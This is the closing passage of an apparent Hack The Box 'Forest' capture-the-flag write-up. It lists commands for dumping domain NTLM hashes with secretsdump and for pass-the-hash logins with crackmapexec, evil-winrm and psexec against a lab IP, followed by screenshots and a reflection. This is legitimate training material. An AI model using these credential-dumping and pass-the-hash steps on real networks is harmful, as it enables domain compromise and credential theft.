> **Attacker Machine**:

```bash
crackmapexec smb 10.10.10.161 -u 'oldb0y' -p 'oldb0y123'
impacket-secretsdump -just-dc-ntlm HTB/oldb0y:oldb0y123@10.10.10.161

crackmapexec smb 10.10.10.161 -u 'Administrator' -H '32...a6' --ntds vss
crackmapexec winrm 10.10.10.161 -u 'Administrator' -H '32...a6'
evil-winrm -i 10.10.10.161 -u 'Administrator' -H '32...a6'
# :)
impacket-psexec -hashes "aa...ea6" Administrator@10.10.10.161

docker rm $(docker ps -a -q) --force
docker rmi $(docker images -q)
docker volume rm $(docker volume ls -q)
docker network rm $(docker network ls -q)
```

<br />
<img src="{{ site.img_path }}/forest_writeup/Forest_63.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/forest_writeup/Forest_64.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/forest_writeup/Forest_65.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/forest_writeup/Forest_66.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/forest_writeup/Forest_67.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/forest_writeup/Forest_68.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/forest_writeup/Forest_69.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/forest_writeup/Forest_70.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

> What a **nice**, **nice** machine the **Forest**, it is **not very complex** attack and privilege escalation, but it is an excellent box to get into the concepts related to **AD**, plus I learned again how to use tools that I had already used but now have advanced in their development and change, improve in their implementation. I'm left with a great feeling of satisfaction and reinforced enthusiasm for the next machine. So from my **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** account I kill the box and I'm already thinking about the next one.

<br /><br />
<img src="{{ site.img_path }}/forest_writeup/Forest_71.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
